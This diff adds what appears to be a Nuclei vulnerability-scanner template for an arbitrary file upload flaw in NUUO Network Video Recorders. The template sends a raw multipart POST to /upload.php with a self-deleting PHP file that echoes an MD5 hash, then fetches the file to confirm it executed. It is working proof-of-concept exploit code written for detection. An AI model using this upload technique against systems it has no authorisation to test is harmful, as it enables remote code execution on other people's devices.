@@ -1,0 +1,54 @@
+id: poc-yaml-nuuo-network-video-recorder-upload-php-anyfile-upload
+info:
+  name: NUUO Network Video Recorder Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------ok4o88lom
+
+        ----------ok4o88lom
+        Content-Disposition: form-data; name="userfile"; filename="{{t1}}.php"
+
+        <?php echo md5({{t1}});@unlink(__FILE__);?>
+        ----------ok4o88lom--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}.php"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+
+  - raw:
+      - |
+        GET /{{t1}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
